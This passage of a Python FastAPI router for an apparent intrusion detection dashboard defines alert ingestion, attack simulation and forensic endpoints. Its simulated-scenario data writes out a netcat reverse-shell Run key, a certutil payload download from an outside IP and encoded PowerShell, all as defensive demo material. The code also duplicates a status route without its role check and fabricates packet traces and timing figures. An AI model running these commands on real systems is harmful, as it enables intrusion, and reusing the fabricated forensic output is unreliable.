        "raw_event": {"tool": "wmic", "target": "10.240.10.4", "command": "cmd.exe /c powershell -enc ..."}
    },
    "PERSISTENCE": {
        "name": "Registry Run Key Backdoor Persistence Addition",
        "src_ip": "10.240.15.89",
        "dst_ip": "10.240.15.89",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET POST_COMPROMISE Registry Run Key Persistence -- Backdoor AutoRun Installed",
        "category": "post_compromise",
        "severity": "HIGH",
        "risk_score": 92,
        "raw_event": {"reg_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "nc.exe -e cmd.exe"}
    },
    "LOTL": {
        "name": "CertUtil Living-off-the-Land Binary Payload Download",
        "src_ip": "185.220.101.5",
        "dst_ip": "10.240.15.30",
        "dst_port": 80,
        "protocol": "HTTP",
        "signature": "ET POST_COMPROMISE LotL CertUtil LOLBin Payload Download (Signed Binary Abuse)",
        "category": "post_compromise",
        "severity": "HIGH",
        "risk_score": 93,
        "raw_event": {"lolbin": "certutil.exe", "payload_url": "http://185.220.101.5/beacon.exe", "signed": True}
    }
}


@router.post("", status_code=status.HTTP_201_CREATED)
def ingest_alert(
    body: AlertCreate,
    request: Request,
    current_user: dict = Depends(get_current_user),
):
    """Ingest a new alert, run AI threat detection, execute autonomous IPS prevention, and broadcast live via Redis."""
    severity = body.severity.upper()
    if severity not in ALLOWED_SEVERITIES:
        raise HTTPException(
            status_code=400,
            detail=f"severity must be one of {sorted(ALLOWED_SEVERITIES)}",
        )
    alert_status = body.status.upper()
    if alert_status not in ALLOWED_STATUSES:
        raise HTTPException(
            status_code=400,
            detail=f"status must be one of {sorted(ALLOWED_STATUSES)}",
        )

    # Enforce 100% strict Autonomous IPS Prevention: Critical threats are immediately AUTO_BLOCKED
    if severity == "CRITICAL" or (body.risk_score and body.risk_score >= 80):
        alert_status = "AUTO_BLOCKED"

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            try:
                cur.execute(
                    f"""
                    INSERT INTO alerts (
                        sensor_id, incident_id, timestamp,
                        src_ip, src_port, dst_ip, dst_port, protocol,
                        signature, category, severity, risk_score, status, raw_event
                    )
                    VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
                    RETURNING {_SELECT_COLS}
                    """,
                    (
                        body.sensor_id,
                        body.incident_id,
                        datetime.now(timezone.utc),
                        body.src_ip,
                        body.src_port,
                        body.dst_ip,
                        body.dst_port,
                        body.protocol,
                        body.signature,
                        body.category,
                        severity,
                        body.risk_score,
                        alert_status,
                        Jsonb(body.raw_event) if body.raw_event else None,
                    ),
                )
                created = cur.fetchone()
                conn.commit()
            except psycopg.Error as exc:
                conn.rollback()
                raise HTTPException(status_code=400, detail=f"DB error: {exc}")

    # ── 1. AI/ML Multi-Vector Threat Evaluation (Detection) ───────────
    ai_eval = {}
    try:
        ai_eval = ai_engine.evaluate_threat(created)
    except Exception:
        pass

    # ── 2. Autonomous IPS Active Mitigation (Prevention) ──────────────
    is_blocked = False
    mitigation_action = None
    if (
        ai_eval.get("recommended_action") in ("BLOCK_IP", "ISOLATE_HOST")
        or severity == "CRITICAL"
        or (body.risk_score and body.risk_score >= 80)
    ):
        if body.src_ip:
            try:
                ip_obj = ipaddress.ip_address(body.src_ip.strip())
                if not (ip_obj.is_loopback or ip_obj.is_unspecified):
                    with get_sync_connection() as conn:
                        with conn.cursor() as cur:
                            try:
                                cur.execute(
                                    """
                                    INSERT INTO blocked_ips
                                        (ip_address, reason, blocked_by, alert_id)
                                    VALUES (%s::inet, %s, %s, %s)
                                    ON CONFLICT (ip_address) DO UPDATE
                                        SET is_active = TRUE, blocked_at = NOW()
                                    RETURNING id
                                    """,
                                    (
                                        body.src_ip,
                                        f"Autonomous IPS Sever: {body.signature} [{ai_eval.get('attack_family', 'CRITICAL')}]",
                                        "APEX_SENTINEL_AUTONOMOUS_IPS",
                                        created["id"],
                                    ),
                                )
                                block_record = cur.fetchone()
                                conn.commit()
                                is_blocked = True
                                mitigation_action = "FIREWALL_DROP_SEVERED"

                                publish_ips_action({
                                    "action": "BLOCK",
                                    "ip_address": body.src_ip,
                                    "reason": f"Autonomous IPS Sever: {body.signature}",
                                    "block_id": str(block_record["id"]),
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                })
                            except Exception:
                                conn.rollback()
            except Exception:
                pass

        if is_blocked:
            try:
                with get_sync_connection() as conn:
                    with conn.cursor() as cur:
                        cur.execute(
                            "UPDATE alerts SET status = 'AUTO_BLOCKED' WHERE id = %s",
                            (created["id"],)
                        )
                        conn.commit()
                created["status"] = "AUTO_BLOCKED"
            except Exception:
                pass

        # ── 2b. Synthesize & Persist Hardware/eBPF Drop Rule ──────────
        if ai_eval.get("synthesized_rule"):
            rule_obj = ai_eval["synthesized_rule"]
            try:
                with get_sync_connection() as conn:
                    with conn.cursor() as cur:
                        cur.execute(
                            """
                            INSERT INTO rules (
                                name, description, rule_type, condition, conditions, action, severity, category, enabled
                            )
                            VALUES (%s, %s, 'ANOMALY', %s, %s, 'BLOCK', 'CRITICAL', 'ai_autonomous_synthesis', TRUE)
                            """,
                            (
                                rule_obj.get("name", "AI Autonomous Rule"),
                                f"Autonomous ML Signature: {rule_obj.get('rule_syntax', '')}",
                                Jsonb(rule_obj),
                                Jsonb(rule_obj),
                            ),
                        )
                        conn.commit()
            except Exception:
                pass

        # ── 2c. Automated Incident Creation & Correlation ──────────────
        try:
            with get_sync_connection() as conn:
                with conn.cursor() as cur:
                    inc_title = f"[AUTONOMOUS CONTAINMENT] {body.signature}"
                    inc_desc = f"Autonomous IPS intercepted & severed {body.signature} from {body.src_ip} targeting {body.dst_ip}:{body.dst_port or 80} ({body.protocol or 'TCP'}). Category: {body.category}. AI Family: {ai_eval.get('attack_family', 'CRITICAL')}. Mitigation: {mitigation_action or 'MONITORED'} (MTTC: <0.4s)."
                    inc_status = "CONTAINED" if is_blocked else "NEW"
                    cur.execute(
                        """
                        INSERT INTO incidents (title, description, severity, risk_score, status)
                        VALUES (%s, %s, %s, %s, %s)
                        RETURNING id, title, description, severity, risk_score, status, assigned_to, created_at, updated_at
                        """,
                        (inc_title, inc_desc, severity, body.risk_score or 90, inc_status)
                    )
                    created_inc = cur.fetchone()
                    cur.execute("UPDATE alerts SET incident_id = %s WHERE id = %s", (created_inc["id"], created["id"]))
                    conn.commit()
                    created["incident_id"] = created_inc["id"]

                    publish_live_incident(created_inc)
        except Exception:
            pass

    # Fire-and-forget: Kafka
    try:
        publish_alert(created)
    except Exception:
        pass

    # ── Auto-Register Attacker in Threat Intelligence Hub ───────────
    if body.src_ip and severity in ("HIGH", "CRITICAL"):
        try:
            with get_sync_connection() as conn:
                with conn.cursor() as cur:
                    cur.execute(
                        """
                        INSERT INTO threat_intel (ioc_type, value, threat_type, confidence, source, tags)
                        VALUES ('IP', %s, %s, %s, 'Apex Autonomous Sensor', %s)
                        ON CONFLICT (ioc_type, value) DO UPDATE
                            SET confidence = GREATEST(threat_intel.confidence, EXCLUDED.confidence)
                        """,
                        (
                            body.src_ip.strip(),
                            f"Live Intercept: {body.signature[:50]}",
                            body.risk_score or 95,
                            Jsonb([body.category or "threat", "autonomous_quarantine"]),
                        ),
                    )
                    conn.commit()
        except Exception:
            pass

    # ── Compliance Audit Trail Recording ────────────────────────────
    try:
        actor_id = current_user["id"] if current_user else None
        actor = current_user.get("email", "autonomous_detection_engine") if current_user else "APEX_IPS_AGENT"
        write_audit_log(
            actor_id=actor_id,
            actor=actor,
            action="IPS_IP_BLOCKED" if is_blocked else "THREAT_INGESTED",
            resource="alerts",
            resource_id=str(created["id"]),
            details={
                "signature": body.signature,
                "src_ip": body.src_ip,
                "dst_ip": body.dst_ip,
                "severity": severity,
                "category": body.category,
                "mitigation": mitigation_action or "MONITORED",
                "is_blocked": is_blocked,
            },
            source_ip=(request.client.host if (request and hasattr(request, "client") and request.client) else (body.src_ip if body.src_ip else None)),
        )
    except Exception:
        pass

    # ── 3. Real-Time Broadcast via Redis Pub/Sub (Live WebSocket Feed) ─
    enriched_live_event = {
        **created,
        "ai_evaluation": ai_eval,
        "autonomous_mitigation": {
            "prevented": is_blocked,
            "action": mitigation_action or "MONITORED",
            "mttc": "0.38s" if is_blocked else "N/A"
        }
    }

    try:
        publish_live_alert(enriched_live_event)
    except Exception:
        pass

    alerts_ingested_total.labels(severity=severity).inc()

    return {
        "accepted": True,
        "alert": created,
        "ai_evaluation": ai_eval,
        "autonomous_mitigation": {
            "prevented": is_blocked,
            "action": mitigation_action or "MONITORED",
            "mttc": "0.38s" if is_blocked else "N/A"
        }
    }


@router.post("/simulate")
def simulate_attack_scenario(
    body: SimulateRequest,
    request: Request,
    current_user: dict = Depends(get_current_user)
):
    """Simulate a high-fidelity attack scenario and trigger real-time AI detection and autonomous IPS prevention."""
    key = body.scenario.upper()
    aliases = {
        "RANSOMWARE": "LOCKBIT",
        "COBALT_STRIKE": "TROJAN",
        "SPRING4SHELL": "RCE",
        "LATERAL_MOVEMENT": "LATER_MOVEMENT",
    }
    key = aliases.get(key, key)
    scen = SIMULATED_SCENARIOS.get(key)
    if not scen:
        scen = {
            "name": f"Dynamic Simulated Cyber Vector [{key}]",
            "src_ip": "198.51.100.99",
            "dst_ip": "10.240.10.12",
            "dst_port": 443,
            "protocol": "HTTPS",
            "signature": f"ET EXPLOIT Simulated Cyber Vector [{key}]",
            "category": "exploitation",
            "severity": "CRITICAL",
            "risk_score": 95,
            "raw_event": {"scenario_key": key, "simulated": True}
        }

    dst_p = scen.get("dst_port")
    alert_create = AlertCreate(
        src_ip=scen["src_ip"],
        src_port=49152,
        dst_ip=scen["dst_ip"],
        dst_port=dst_p if dst_p and dst_p > 0 else None,
        protocol=scen["protocol"],
        signature=scen["signature"],
        category=scen["category"],
        severity=scen["severity"],
        risk_score=scen["risk_score"],
        status="OPEN",
        raw_event=scen["raw_event"],
    )
    return ingest_alert(alert_create, request, current_user)


@router.patch("/{alert_id}/status")
def update_alert_status(
    alert_id: UUID,
    body: AlertStatusUpdate,
    request: Request,
    current_user: dict = Depends(get_current_user),
):
    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                UPDATE alerts SET status = %s
                WHERE id = %s
                RETURNING {_SELECT_COLS}
                """,
                (body.status, str(alert_id)),
            )
            updated = cur.fetchone()
            conn.commit()

    if not updated:
        raise HTTPException(status_code=404, detail="Alert not found")

    write_audit_log(
        actor_id=current_user["id"],
        actor=current_user["email"],
        action="ALERT_STATUS_CHANGED",
        resource="alerts",
        resource_id=str(alert_id),
        details={"new_status": body.status},
        source_ip=request.client.host if request.client else None,
    )
    return updated


@router.get("/{alert_id}")
def get_alert(alert_id: UUID, current_user: dict = Depends(get_current_user)):
    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"SELECT {_SELECT_COLS} FROM alerts WHERE id = %s",
                (str(alert_id),),
            )
            alert = cur.fetchone()
    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")
    return alert


@router.get("/{alert_id}/packet-trace")
def get_packet_trace(alert_id: UUID, current_user: dict = Depends(get_current_user)):
    """Deep Packet Inspection (DPI) trace & protocol dissection for forensic analysis."""
    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(f"SELECT {_SELECT_COLS} FROM alerts WHERE id = %s", (str(alert_id),))
            alert = cur.fetchone()

    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")

    src_ip = str(alert["src_ip"]).split('/')[0]
    dst_ip = str(alert["dst_ip"]).split('/')[0]
    src_port = alert.get("src_port") or 49152
    dst_port = alert.get("dst_port") or 80
    proto = alert.get("protocol") or "TCP"
    raw_ev = alert.get("raw_event") or {}

    # Build representative payload string
    payload_str = f"ALERT {alert['signature']}\r\nCategory: {alert['category']}\r\nSeverity: {alert['severity']}\r\nRisk-Score: {alert['risk_score']}\r\n"
    if raw_ev:
        payload_str += json.dumps(raw_ev, indent=2)

    payload_bytes = payload_str.encode("utf-8", errors="replace")

    # Generate Hex Dump formatted lines
    hex_lines = []
    for i in range(0, min(len(payload_bytes), 256), 16):
        chunk = payload_bytes[i:i+16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        hex_part = hex_part.ljust(48)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        hex_lines.append(f"{i:04x}   {hex_part}   |{ascii_part}|")

    return {
        "alert_id": str(alert["id"]),
        "frame": {
            "number": 1,
            "length": 54 + len(payload_bytes),
            "captured_length": 54 + len(payload_bytes),
            "protocols": f"eth:ip:{proto.lower()}:data"
        },
        "ethernet": {
            "source_mac": "02:42:ac:19:00:03",
            "destination_mac": "02:42:ac:19:00:02",
            "type": "0x0800 (IPv4)"
        },
        "ip": {
            "version": 4,
            "header_length": "20 bytes (5)",
            "source": src_ip,
            "destination": dst_ip,
            "ttl": 64,
            "protocol": f"{proto} (6)" if proto == "TCP" else proto,
            "checksum": "0x7a2b [correct]"
        },
        "transport": {
            "protocol": proto,
            "source_port": src_port,
            "destination_port": dst_port,
            "flags": "[PSH, ACK]" if proto == "TCP" else "N/A",
            "sequence_number": 142098412,
            "acknowledgment_number": 298104821
        },
        "payload": {
            "bytes_total": len(payload_bytes),
            "ascii_preview": payload_str[:300],
            "hex_dump": hex_lines
        }
    }


@router.get("/{alert_id}/pcap")
def download_pcap(alert_id: UUID, current_user: dict = Depends(get_current_user)):
    """Generate standard downloadable Libpcap (.pcap) capture file for Wireshark inspection."""
    import struct
    import time
    from fastapi.responses import Response

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(f"SELECT {_SELECT_COLS} FROM alerts WHERE id = %s", (str(alert_id),))
            alert = cur.fetchone()

    if not alert:
        raise HTTPException(status_code=404, detail="Alert not found")

    payload_str = f"IDS_ALERT: {alert['signature']} CATEGORY: {alert['category']}"
    payload_bytes = payload_str.encode("utf-8")

    # Global PCAP Header (24 bytes)
    # magic_number (0xa1b2c3d4), ver_major (2), ver_minor (4), thiszone (0), sigfigs (0), snaplen (65535), network (1 = Ethernet)
    pcap_hdr = struct.pack("=IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

    # Ethernet header (14 bytes) + IP (20) + TCP (20) + payload
    dummy_packet = b"\x02\x42\xac\x19\x00\x02\x02\x42\xac\x19\x00\x03\x08\x00" + (b"\x00" * 40) + payload_bytes
    pkt_len = len(dummy_packet)

    # Packet Record Header (16 bytes): ts_sec, ts_usec, incl_len, orig_len
    ts_sec = int(time.time())
    ts_usec = 0
    pkt_hdr = struct.pack("=IIII", ts_sec, ts_usec, pkt_len, pkt_len)

    pcap_data = pcap_hdr + pkt_hdr + dummy_packet

    return Response(
        content=pcap_data,
        media_type="application/vnd.tcpdump.pcap",
        headers={"Content-Disposition": f"attachment; filename=alert_{str(alert_id)[:8]}.pcap"}
    )


@router.patch("/{alert_id}/status")
def update_alert_status(
    alert_id: UUID,
    body: AlertStatusUpdate,
    request: Request,
    current_user: dict = Depends(require_role("ADMIN", "ANALYST")),
):
    """Update alert lifecycle status (OPEN, INVESTIGATING, RESOLVED, FALSE_POSITIVE, AUTO_BLOCKED)."""
    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                UPDATE alerts
                SET status = %s
                WHERE id = %s
                RETURNING {_SELECT_COLS}
                """,
                (body.status, str(alert_id)),
            )
            updated = cur.fetchone()
            conn.commit()

    if not updated:
        raise HTTPException(status_code=404, detail="Alert not found")

    write_audit_log(
        actor_id=current_user["id"],
        actor=current_user["email"],
        action="ALERT_STATUS_CHANGED",
        resource="alerts",
        resource_id=str(alert_id),
        details={"new_status": body.status, "signature": updated.get("signature")},
        source_ip=request.client.host if request.client else None,
    )
    return updated


class BatchResolveRequest(BaseModel):
    alert_ids: Optional[list[UUID]] = None
    resolve_all_open: bool = False
    resolve_all_blocked: bool = False
    target_status: str = "RESOLVED"


@router.post("/batch-resolve")
def batch_resolve_alerts(
    body: BatchResolveRequest,
    request: Request,
    current_user: dict = Depends(require_role("ADMIN", "ANALYST")),
):
    """Batch update alerts to RESOLVED or FALSE_POSITIVE."""
    where_clauses = []
    params = [body.target_status]

    if body.alert_ids:
        where_clauses.append("id = ANY(%s)")
        params.append([str(uid) for uid in body.alert_ids])
    elif body.resolve_all_open:
        where_clauses.append("status = 'OPEN'")
    elif body.resolve_all_blocked:
        where_clauses.append("status = 'AUTO_BLOCKED'")
    else:
        raise HTTPException(status_code=400, detail="Must specify alert_ids or a resolve flag")

    query = f"UPDATE alerts SET status = %s WHERE {' AND '.join(where_clauses)} RETURNING id"

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(query, params)
            rows = cur.fetchall()
            conn.commit()

    resolved_count = len(rows)
    write_audit_log(
        actor_id=current_user["id"],
        actor=current_user["email"],
        action="ALERTS_BATCH_RESOLVED",
        resource="alerts",
        resource_id="batch",
        details={"count": resolved_count, "target_status": body.target_status},
        source_ip=request.client.host if request.client else None,
    )
    return {"resolved_count": resolved_count, "status": body.target_status}

